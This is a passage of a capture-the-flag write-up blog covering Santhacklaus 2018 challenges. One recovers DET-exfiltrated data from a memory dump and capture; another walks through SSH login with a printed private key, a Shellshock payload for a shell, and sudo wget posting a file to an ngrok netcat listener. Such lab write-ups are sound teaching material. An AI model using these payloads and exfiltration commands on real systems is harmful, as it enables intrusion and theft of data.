unsplit.zip Length Date Time Name --------- ---------- ----- ---- 30 2018-12-16 16:57 flag.txt 0 2018-12-16 15:51 jcvd-website/ 0 2018-12-16 15:51 jcvd-website/js/ 6148 2018-12-16 15:51 jcvd-website/js/.DS_Store 36816 2018-12-16 15:51 jcvd-website/js/bootstrap.min.js 95957 2018-12-16 15:51 jcvd-website/js/jquery-1.11.3.min.js 68890 2018-12-16 15:51 jcvd-website/js/bootstrap.js 79 2018-12-16 15:51 jcvd-website/js/custom.js 641 2018-12-16 15:51 jcvd-website/js/ie10-viewport-bug-workaround.js 5564 2018-12-16 15:51 jcvd-website/js/jquery.easing.min.js 12292 2018-12-16 15:51 jcvd-website/.DS_Store 0 2018-12-16 15:51 jcvd-website/images/ 37682 2018-12-16 15:51 jcvd-website/images/concert.jpg 6148 2018-12-16 15:51 jcvd-website/images/.DS_Store 52003 2018-12-16 15:51 jcvd-website/images/microphone.jpg 49276 2018-12-16 15:51 jcvd-website/images/iphone.jpg 91733 2018-12-16 15:51 jcvd-website/images/header.jpg 26267 2018-12-16 15:51 jcvd-website/images/writing.jpg 133773 2018-12-16 15:51 jcvd-website/images/pencil_sharpener.jpg 7384 2018-12-16 15:51 jcvd-website/index.html 0 2018-12-16 15:51 jcvd-website/fonts/ 45404 2018-12-16 15:51 jcvd-website/fonts/glyphicons-halflings-regular.ttf 18028 2018-12-16 15:51 jcvd-website/fonts/glyphicons-halflings-regular.woff2 23424 2018-12-16 15:51 jcvd-website/fonts/glyphicons-halflings-regular.woff 20127 2018-12-16 15:51 jcvd-website/fonts/glyphicons-halflings-regular.eot 108738 2018-12-16 15:51 jcvd-website/fonts/glyphicons-halflings-regular.svg 0 2018-12-16 15:51 jcvd-website/css/ 6148 2018-12-16 15:51 jcvd-website/css/.DS_Store 147430 2018-12-16 15:51 jcvd-website/css/bootstrap.css 8335 2018-12-16 15:51 jcvd-website/css/custom.css 122540 2018-12-16 15:51 jcvd-website/css/bootstrap.min.css ---","date":"2018-12-19","objectID":"maki.bzh/writeups/santhacklaus2018missionimpossible/:1:4","tags":["santhacklaus","pinkflood","volatility","linux","profile","zip","det"],"title":"[Santhacklaus 2018] - Mission impossible","uri":"maki.bzh/writeups/santhacklaus2018missionimpossible/"},{"categories":["Writeups"],"content":"Flag $ strings bitedepoulet.zip | grep IMTLD IMTLD{z1p_1s_n0t_alw4y5_s4fe} ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhacklaus2018missionimpossible/:1:5","tags":["santhacklaus","pinkflood","volatility","linux","profile","zip","det"],"title":"[Santhacklaus 2018] - Mission impossible","uri":"maki.bzh/writeups/santhacklaus2018missionimpossible/"},{"categories":["Writeups"],"content":"Mission impossible 2 ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhacklaus2018missionimpossible/:2:0","tags":["santhacklaus","pinkflood","volatility","linux","profile","zip","det"],"title":"[Santhacklaus 2018] - Mission impossible","uri":"maki.bzh/writeups/santhacklaus2018missionimpossible/"},{"categories":["Writeups"],"content":"Statement (Awesome work again for the video :D) ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhacklaus2018missionimpossible/:2:1","tags":["santhacklaus","pinkflood","volatility","linux","profile","zip","det"],"title":"[Santhacklaus 2018] - Mission impossible","uri":"maki.bzh/writeups/santhacklaus2018missionimpossible/"},{"categories":["Writeups"],"content":"State of the art We got again a Debian memory dump, fortunately it’s the same profile for the Mission impossible 1 and this one. $ volatility -f challenge.raw --profile=LinuxMI1_profilex64 linux_banner Linux version 3.16.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb8u1) ) #1 SMP Debian 3.16.57-2 (2018-07-14) $ volatility -f challenge.raw --profile=LinuxMI1_profilex64 linux_bash Pid Name Command Time Command -------- -------------------- ------------------------------ ------- 1715 bash 2018-11-09 22:56:08 UTC+0000 cd DET/ 1715 bash 2018-11-09 22:56:08 UTC+0000 nano config.json 1715 bash 2018-11-09 22:56:08 UTC+0000 sudo pip install -r requirements.txt 1715 bash 2018-11-09 22:56:08 UTC+0000 cd /opt/ 1715 bash 2018-11-09 22:56:08 UTC+0000 ls -alh 1715 bash 2018-11-09 22:56:08 UTC+0000 sudo git clone https://github.com/sensepost/DET 1715 bash 2018-11-09 22:56:08 UTC+0000 sudo python det.py -c config.json -p icmp,http -f flag.zip 1715 bash 2018-11-09 22:56:08 UTC+0000 rm flag.zip 1715 bash 2018-11-09 22:56:08 UTC+0000 cp config-sample.json config.json 1715 bash 2018-11-09 22:56:08 UTC+0000 zip flag.zip flag.jpg -P IMTLD{N0t_Th3_Fl4g} 1715 bash 2018-11-09 22:56:08 UTC+0000 rm flag.jpg 1715 bash 2018-11-09 22:56:08 UTC+0000 sudo chown -R evil-hacker:evil-hacker /opt/DET/ 1715 bash 2018-11-09 22:56:08 UTC+0000 cp -v /media/evil-hacker/DISK_IMG/FOR05/flag.jpg . 1715 bash 2018-11-09 22:56:47 UTC+0000 history 1715 bash 2018-11-09 22:57:12 UTC+0000 cd /opt/DET/ 1715 bash 2018-11-09 22:57:48 UTC+0000 find . -type f -print0 | xargs -0 md5sum md5sums.txt 1715 bash 2018-11-09 22:57:57 UTC+0000 find . -type f -print0 | xargs -0 md5sum \u003e md5sums.txt Owh! The user is used DET (Data Exfiltration Toolkit), a little client / server for data exfiltration made by @PaulWebSec: https://github.com/sensepost/DET So, the evil hacker exfiltrates his data through ICMP and HTTP, according to the bash history. Fortunately, it’s what we got in the PCAP: red framed shows the ICMP data green framed shows the HTTP data ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhacklaus2018missionimpossible/:2:2","tags":["santhacklaus","pinkflood","volatility","linux","profile","zip","det"],"title":"[Santhacklaus 2018] - Mission impossible","uri":"maki.bzh/writeups/santhacklaus2018missionimpossible/"},{"categories":["Writeups"],"content":"How DET works? It uses a configuration file config.json: $ volatility -f challenge.raw --profile=LinuxMI1_profilex64 linux_find_file -L \u003e filelist $ cat filelist | grep config.json 672629 0xffff88003c16ec80 /opt/DET/config.json $ volatility -f challenge.raw --profile=LinuxMI1_profilex64 linux_find_file -i 0xffff88003c16ec80 -O config.json $ cat config.json { \"plugins\": { \"http\": { \"target\": \"192.168.0.29\", \"port\": 8080 }, \"google_docs\": { \"target\": \"SERVER\", \"port\": 8080 }, \"dns\": { \"key\": \"google.com\", \"target\": \"192.168.0.29\", \"port\": 53 }, \"gmail\": { \"username\": \"dataexfil@gmail.com\", \"password\": \"CrazyNicePassword\", \"server\": \"smtp.gmail.com\", \"port\": 587 }, \"tcp\": { \"target\": \"192.168.0.29\", \"port\": 6969 }, \"udp\": { \"target\": \"192.168.0.29\", \"port\": 6969 }, \"twitter\": { \"username\": \"PaulWebSec\", \"CONSUMER_TOKEN\": \"XXXXXXXXXXX\", \"CONSUMER_SECRET\": \"XXXXXXXXXXX\", \"ACCESS_TOKEN\": \"XXXXXXXXXXX\", \"ACCESS_TOKEN_SECRET\": \"XXXXXXXXXXX\" }, \"icmp\": { \"target\": \"192.168.0.29\" }, \"slack\": { \"api_token\": \"xoxb-XXXXXXXXXXX\", \"chan_id\": \"XXXXXXXXXXX\", \"bot_id\": \"\u003c@XXXXXXXXXXX\u003e:\" } }, \"AES_KEY\": \"IMTLD{This_is_just_a_key_not_the_flag}\", \"max_time_sleep\": 10, \"min_time_sleep\": 1, \"max_bytes_read\": 400, \"min_bytes_read\": 300, \"compression\": 1 } So, now we got those informations: AES Key: IMTLD{This_is_just_a_key_not_the_flag} We know it uses DET compression (zlib) ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhacklaus2018missionimpossible/:2:3","tags":["santhacklaus","pinkflood","volatility","linux","profile","zip","det"],"title":"[Santhacklaus 2018] - Mission impossible","uri":"maki.bzh/writeups/santhacklaus2018missionimpossible/"},{"categories":["Writeups"],"content":"How data are exfiltrated? This is what it looks like in HTTP packets: With a little tshark command I was able to extract all base64: $ tshark -r challenge.pcapng -Y http -Tfields -e urlencoded-form.value \u003e data_http.b64 $ cat data_http.b64 | base64 -d | less z6f9HaX|!|1|!|246760c25e3f659efe1b8299032616c0a6c92ce1d72addcf01183fd535d83abc5ce238d49d9bd255e8be9161ba00ab68a5dc2882c9159d055002085b7c0bb55b5ffe596b9229ac6280acacec248d187b2559fc4e1d8eb2a2711aeaf96616b52c39410d6423f877817cdb8e827086badbf1390331c87e2291c56756f696f4f02bb26d2ccf93c906c91ddebe9a2f68086e679a3c562217646afe79227ef5b9c485ffaef859fe42c35e4627a63c017d39b5e8d11fb32ddce0d88cbbb5a74c0215e3be78de850fa30b0b03cffaa041096810459559864c9f0bc0ac4e214c58ca8b89b73248130f096005a00b555d028d8c8cd7f69e57d6f925c2ea262a3b067d809dfaf8f825e7c4b8e02a54376d5d209a1e15a3866f544a03917a80cc183def3b6fac629a5e6fbdcbcf6cbe0a1713791651fbf6cd1917601b18709e3738bc03c4ba8ce55f13df90ed4603bb1d86de0fa4ab8d36a4ab010477e3270d31439e446d872730 z6f9HaX|!|5|!|8f7507923c3481c900f9d0c2b84b9517b1b0bf488148a9759bf26205c6471295e591587ae7d11d871bd31080b390d444d972a60eb799d3ea8ac7da599695588c8052a5d14ea1aa93ae6af1d6f76f4d62483a60f1c6e3713d31245f1817699695f1cb44e4b4ce1a6737cab1ac04f17a21d1053be83a6a59bc287ee5a42a7ec6dff033645715ef41e72bcf7495fcf04785c7612bd64def432940f13959c73d9cf79fb364ba6a5a891a713abb58bde1486caf187f9a398078c0744652838059ce0d10b903279692f0513e0f88af96796d85ab2f712866c2d8637a746e0d228bb736384e6c43ef253a0aa7cfba1219ce2393ce57bcf05b53a858858a665bc80d46c51289dcb6e9674c30563d03bbb80221e714349ffadf19afcce37206b8da66ef5f7fb2f3739c64f9699536ff545b73a6d37de627cb [...] $ tshark -r challenge.pcapng -Y icmp.resp_to -Tfields -e data.data | tr -d ':' | xxd -r -p | sed 's/ejZmO/\\nejZmO/g' \u003e data_icmp.b64 $ cat data_icmp.b64 | base64 -d | less z6f9HaX|!|flag.zip|!|REGISTER|!|3682490664d5bf7905397710edb84737 z6f9HaX|!|0|!|f8e946873b6e3a34035d82b1aadec650edc693c449b064a06bd1c7432e801193b497f998d1265e7e9da7b4ea56d650ae0dfbd717ef4dd1418d2d9b4e68b835f166643a705acd64c60e56add715a064524363bff1152aae8c2b2e82548c7f7f0f69690d18733e42de352ce5bb6fd5b2b696688ad84a80d3862cab8274d4b5a79065f4be827f36cd0271ae6ed1306107437e26bbdfce7fcfe3d0840e03a4bb5b776b5501582240cbaeccc8c6969653973805209cdcdc2e2c70325cabf8ecc8ad7f192b8b0d7c0bde5489a10e23175a4e593641862d625145d3a9f1b8de163325c534bc6c303109f63b2bd7ea5bdd22cefd8e1415b8374811c5d656eac67b924e2f7f170821b77361513ad6d9e0972641f83a8cac5776e09320b657dd0c1d6449c19c032d77d92c80fa991e9eefc585aab8e7a5feb56ea7 z6f9HaX|!|2|!|3de71e0826b4f3c85d0b17931d2effd04913e6320e30e73f5cc652c9e3a7f3bb4bbce092648283324298d594aae4f8bfa73732b492e479c4d1d642310ce0a3344186f9bc21ac86833010ef2bd6b2e31b9251690902b660448f88b9dc48963270d603942fc5910715d0d4f18224316f571116e05be4f0404f468ef856eab4ad6f38683aa0b935d0bc9933231d3262b54aca672be1fd2cb0d59fc49c807de24dc582501396dd54b67efe2fe7687b0c62de63de5c278200c3288269729cf7428fc0b48298699a808a141fc3bee1ba01a90c51faed07c3d35149c5988f9301e2e70a9d955b1545581522f90f4a2e9c88cf8e502bca12128ba0cb77409220c259035bc3ca1727e017713abb08b9491675f20bad831ba685edaefa572ca8da0c56bfb3615048a0764305dc219936237f5764cdc1031d024591c66ef92d38bbe9a73614411e27z6f9HaX|!|3|!|8037dbd29c0393e519050999210fe5ce63880109a09bf879b09b8b9f952d438d51d8b54 [...] Ok, the data follow the following pattern: ID|!|number|!|AES encrypted data ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhacklaus2018missionimpossible/:2:4","tags":["santhacklaus","pinkflood","volatility","linux","profile","zip","det"],"title":"[Santhacklaus 2018] - Mission impossible","uri":"maki.bzh/writeups/santhacklaus2018missionimpossible/"},{"categories":["Writeups"],"content":"Scripting and decryption time According the previous scenarios, I just have to sort all packet by number, extract encrypted data and decrypt / decompress it. Here is my quick and dirty script: #!/usr/bin/python2 from base64 import b64decode from Crypto.Cipher import AES import hashlib from zlib import compress, decompress # Function from DET Github def aes_decrypt(message,key): iv = message[:AES.block_size] message = message[AES.block_size:] aes = AES.new(hashlib.sha256(key).digest(), AES.MODE_CBC, iv) message = aes.decrypt(message) unpad = lambda s: s[:-ord(s[len(s)-1:])] return unpad(message) tmp = {} f = open('data_http.b64','r') data_http = f.read() f.close() data_http = filter(bool, data_http.split('\\n')) clear_http = [] for i in data_http: clear_http.append(b64decode(i)) # Dictionnary creation from http data for i in range(0,len(clear_http)): tmp[int(clear_http[i].split('|')[2])] = clear_http[i].split('|')[4] g = open('data_icmp.b64','r') data_icmp = g.read().split('\\n') g.close() clear_icmp = [] for i in data_icmp: clear_icmp.append(b64decode(i)) clear_icmp.pop(0) clear_icmp.pop(0) # Dictionnary append with icmp data for j in range(0,len(clear_icmp)): tmp[int(clear_icmp[j].split('|')[2])] = clear_icmp[j].split('|')[4] final = \"\" for i in range(0,len(tmp)): final += tmp[i] final = final[:-4] flag = aes_decrypt(final.decode('hex'),\"IMTLD{This_is_just_a_key_not_the_flag}\") flag = decompress(flag) # zlib decompression h = open('flag.dat','wb') h.write(flag) h.close() print \"[+] flag.dat written :)\" $ ./decrypt.py [+] flag.dat written :) $ file flag.dat flag.dat: Zip archive data, at least v2.0 to extract $ unzip -l flag.dat Archive: flag.dat Length Date Time Name --------- ---------- ----- ---- 25369 2018-11-09 22:34 flag.jpg --------- ------- 25369 1 file $ unzip flag.dat Archive: flag.dat [flag.dat] flag.jpg password: IMTLD{N0t_Th3_Fl4g} inflating: flag.jpg $ file flag.jpg flag.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, baseline, precision 8, 706x396, components 1 ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhacklaus2018missionimpossible/:2:5","tags":["santhacklaus","pinkflood","volatility","linux","profile","zip","det"],"title":"[Santhacklaus 2018] - Mission impossible","uri":"maki.bzh/writeups/santhacklaus2018missionimpossible/"},{"categories":["Writeups"],"content":"Flag ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhacklaus2018missionimpossible/:2:6","tags":["santhacklaus","pinkflood","volatility","linux","profile","zip","det"],"title":"[Santhacklaus 2018] - Mission impossible","uri":"maki.bzh/writeups/santhacklaus2018missionimpossible/"},{"categories":["Writeups"],"content":"NetRunner 1/3 ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhacklaus2018netrunner/:1:0","tags":["santhacklaus","pinkflood","pentest","web","xxe","oob","sqli","ngrok"],"title":"[Santhacklaus 2018] - NetRunner","uri":"maki.bzh/writeups/santhacklaus2018netrunner/"},{"categories":["Writeups"],"content":"Statement ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhacklaus2018netrunner/:1:1","tags":["santhacklaus","pinkflood","pentest","web","xxe","oob","sqli","ngrok"],"title":"[Santhacklaus 2018] - NetRunner","uri":"maki.bzh/writeups/santhacklaus2018netrunner/"},{"categories":["Writeups"],"content":"State of the art Ok, we got a sexy website: A login form, we don’t have to use scanner or something like that, I want to say “SQL injection”. After several tries, indeed, it’s a full blind sql injection: ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhacklaus2018netrunner/:1:2","tags":["santhacklaus","pinkflood","pentest","web","xxe","oob","sqli","ngrok"],"title":"[Santhacklaus 2018] - NetRunner","uri":"maki.bzh/writeups/santhacklaus2018netrunner/"},{"categories":["Writeups"],"content":"Bypass I could try to script something or use SQLMap to extract all the database. And it’s probably that’s what I would have done before SIGSEGv1 event. I was near Geluchat during the CTF and he first blooded one of the hardest web challenge. He also explained me how he did. During his SQL injection he played with LIMIT SQL statement, let’s try here: ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhacklaus2018netrunner/:1:3","tags":["santhacklaus","pinkflood","pentest","web","xxe","oob","sqli","ngrok"],"title":"[Santhacklaus 2018] - NetRunner","uri":"maki.bzh/writeups/santhacklaus2018netrunner/"},{"categories":["Writeups"],"content":"Flag IMTLD{w3b_1nT3rf4ceS_4r3_3v1L} ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhacklaus2018netrunner/:1:4","tags":["santhacklaus","pinkflood","pentest","web","xxe","oob","sqli","ngrok"],"title":"[Santhacklaus 2018] - NetRunner","uri":"maki.bzh/writeups/santhacklaus2018netrunner/"},{"categories":["Writeups"],"content":"NetRunner 2/3 Event Challenge Category Points Solves Santhacklaus NetRunner 2/3 App-Script 750 18 ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhacklaus2018netrunner/:2:0","tags":["santhacklaus","pinkflood","pentest","web","xxe","oob","sqli","ngrok"],"title":"[Santhacklaus 2018] - NetRunner","uri":"maki.bzh/writeups/santhacklaus2018netrunner/"},{"categories":["Writeups"],"content":"Statement ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhacklaus2018netrunner/:2:1","tags":["santhacklaus","pinkflood","pentest","web","xxe","oob","sqli","ngrok"],"title":"[Santhacklaus 2018] - NetRunner","uri":"maki.bzh/writeups/santhacklaus2018netrunner/"},{"categories":["Writeups"],"content":"State of the art At the end of the previous challenge we got the SSH private key of puppet-master user: -----BEGIN RSA PRIVATE KEY----- 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 -----END RSA PRIVATE KEY----- $ ssh -i /home/maki/Documents/chall/imtld/netrunnners/priv.key puppet-master@51.75.202.113 -p 2021 .___..___.___..__..___..___ __ . . _/ [__ | [__] | [__ / `|__| ./__.[___ | | | | [___\\__.| | Do not use Zetatech maintenance interface if you are not authorized by Zetatech Corporation. ████████████████████████████ CONNECTION ESTABLISHED ████████████████████████████ ----------------------------- General Informations ----------------------------- Software Version ::: 10.5.2546_b1 [OBSOLETE] Client ID ::: 1534D 4245 97554 P General health ::: [ALIVE] Management interface ::: [ONLINE] Maintenance link ::: [ONLINE] ----------------------- Installed Cyb","date":"2018-12-19","objectID":"maki.bzh/writeups/santhacklaus2018netrunner/:2:2","tags":["santhacklaus","pinkflood","pentest","web","xxe","oob","sqli","ngrok"],"title":"[Santhacklaus 2018] - NetRunner","uri":"maki.bzh/writeups/santhacklaus2018netrunner/"},{"categories":["Writeups"],"content":"Exploitation In this challenge, you have to find a way to keep the session open. I first tried to use -N parameter of SSH, but it doesn’t work. So I asked to Google: http://lmgtfy.com/?q=ssh+immediate+disconnection+ctf And finally found this writeup: https://securitybytes.io/vulnhub-com-tr0ll2-ctf-walkthrough-9993042f8af8 So, go on, I tried with a Shellshock payload: $ ssh -i /home/maki/Documents/chall/imtld/netrunnners/priv.key puppet-master@51.75.202.113 -p 2021 '() { :;}; /bin/bash' .___..___.___..__..___..___ __ . . _/ [__ | [__] | [__ / `|__| ./__.[___ | | | | [___\\__.| | Do not use Zetatech maintenance interface if you are not authorized by Zetatech Corporation. ls client.note status.sh tech.note id uid=1001(puppet-master) gid=1001(puppet-master) groups=1001(puppet-master) It work! But before going further, I want to have a fully functionnal bash: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/ # On remote server $ which python3 /usr/bin/python3 $ python3 -c \"import pty;pty.spawn('/bin/bash')\" puppet-master@2a87f3ade358:~$ # Do CTRL + Z to suspend to current job # On localhost localhost $ stty raw -echo localhost $ fg # It will not be display localhost $ reset reset: unknown terminal type unknown Terminal type? xterm # On remote server puppet-master@2a87f3ade358:~$ id uid=1001(puppet-master) gid=1001(puppet-master) groups=1001(puppet-master) And now we got auto-completion, we can use CTRL + C, we can edit files with vim :D puppet-master@2a87f3ade358:~$ cat client.note .___..___.___..__..___..___ __ . . _/ [__ | [__] | [__ / `|__| ./__.[___ | | | | [___\\__.| | :::: Client Note :::: You can access to your web interface to have more informations. You can use this maintenance interface anytime to check your Cybernetics Prosthetics status. If you have any issues with Zetatech products, please contact us. Note: the password is the same than your username. :: IMTLD{Pr0t3ct_Y0uR_Gh0sT} ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhacklaus2018netrunner/:2:3","tags":["santhacklaus","pinkflood","pentest","web","xxe","oob","sqli","ngrok"],"title":"[Santhacklaus 2018] - NetRunner","uri":"maki.bzh/writeups/santhacklaus2018netrunner/"},{"categories":["Writeups"],"content":"Flag IMTLD{Pr0t3ct_Y0uR_Gh0sT} ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhacklaus2018netrunner/:2:4","tags":["santhacklaus","pinkflood","pentest","web","xxe","oob","sqli","ngrok"],"title":"[Santhacklaus 2018] - NetRunner","uri":"maki.bzh/writeups/santhacklaus2018netrunner/"},{"categories":["Writeups"],"content":"NetRunner 3/3 Event Challenge Category Points Solves Santhacklaus NetRunner 3/3 App-Script 450 18 ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhacklaus2018netrunner/:3:0","tags":["santhacklaus","pinkflood","pentest","web","xxe","oob","sqli","ngrok"],"title":"[Santhacklaus 2018] - NetRunner","uri":"maki.bzh/writeups/santhacklaus2018netrunner/"},{"categories":["Writeups"],"content":"Statement ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhacklaus2018netrunner/:3:1","tags":["santhacklaus","pinkflood","pentest","web","xxe","oob","sqli","ngrok"],"title":"[Santhacklaus 2018] - NetRunner","uri":"maki.bzh/writeups/santhacklaus2018netrunner/"},{"categories":["Writeups"],"content":"State of the art At this point, the goal is pretty obvious: get privileged access. During a pentest there are some attack vectors: sudo misconfigured crontab or services running as privileged user suid binary or script to exploit ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhacklaus2018netrunner/:3:2","tags":["santhacklaus","pinkflood","pentest","web","xxe","oob","sqli","ngrok"],"title":"[Santhacklaus 2018] - NetRunner","uri":"maki.bzh/writeups/santhacklaus2018netrunner/"},{"categories":["Writeups"],"content":"Sudo misconfigured Here, this is a misconfigured sudo: $ sudo -l [sudo] password for puppet-master: puppet-master Matching Defaults entries for puppet-master on 2a87f3ade358: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, lecture=never User puppet-master may run the following commands on 2a87f3ade358: (puppet-master : zetatech-maintenance) /usr/bin/wget Most of the time, the user can run a command as root without password. In this case, the vulnerability comes with the zetatech-maintenance group. What could happen if we execute command with this group? We will getting group right :D ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhacklaus2018netrunner/:3:3","tags":["santhacklaus","pinkflood","pentest","web","xxe","oob","sqli","ngrok"],"title":"[Santhacklaus 2018] - NetRunner","uri":"maki.bzh/writeups/santhacklaus2018netrunner/"},{"categories":["Writeups"],"content":"Exploit I don’t have my VPS under my hand, then I will use ngrok, it allows us to open a port through their server and listen / send data on it: https://ngrok.com/ It works like that (picture from their official website): First localhost terminal: $ ngrok tcp 1223 [...] Web interface http://127.0.0.1:4040 Forwarding tcp://0.tcp.ngrok.io:15462 -\u003e localhost:1223 [...] Second local host terminal $ ping 0.tcp.ngrok.io PING 0.tcp.ngrok.io (52.15.72.79) 56(84) bytes of data. ^C --- 0.tcp.ngrok.io ping statistics --- 1 packets transmitted, 0 received, 100% packet loss, time 0ms $ nc -lvp 1223 Listening on [0.0.0.0] (family 0, port 1223) On remote server terminal puppet-master@2a87f3ade358:~$ sudo -g zetatech-maintenance wget --post-file /home/puppet-master/tech.not http://52.15.72.79:15462 And magic appears in our second localhost terminal: $ nc -lvp 1223 Listening on [0.0.0.0] (family 0, port 1223) Connection from localhost 53726 received! POST / HTTP/1.1 User-Agent: Wget/1.18 (linux-gnu) Accept: */* 